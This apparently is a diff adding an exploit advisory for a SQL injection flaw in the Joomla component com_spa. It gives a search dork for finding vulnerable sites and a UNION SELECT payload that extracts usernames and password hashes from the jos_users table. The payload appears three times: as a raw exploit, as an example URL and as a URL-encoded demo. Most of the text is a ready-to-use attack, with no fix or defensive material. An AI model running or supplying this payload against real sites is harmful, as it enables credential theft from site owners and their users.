@@ -1,0 +1,24 @@
+====================================================
+Joomla Component com_spa SQL Injection Vulnerability
+====================================================
+
+Author :   altbta
+Email  : [l_9[at]hotmail[dot]com]
+Homepage : { www.xp10.com/xp10 }
+DORK    :  inurl:"index.php?option=com_spa"
+===================================================
+
+[+] Vulnerable File :
+http://www.site.com/index.php?option=com_spa&view=spa_read_more&pid=[SQL]
+
+[+] ExploiT :
+-35 UNION SELECT 1,2,3,4,concat(username,0x3a,password),6,7,8,9,10,11,12,13
+from jos_users--
+
+[+] Example :
+http://www.site.com/index.php?option=com_spa&view=spa_read_more&pid=-35UNION
+SELECT 1,2,3,4,concat(username,0x3a,password),6,7,8,9,10,11,12,13 from
+jos_users--
+
+[+] Demo :
+http://www.site.com/index.php?option=com_spa&view=spa_read_more&pid=-35%20UNION%20SELECT%201,2,3,4,concat(username,0x3a,password),6,7,8,9,10,11,12,13%20from%20jos_users--
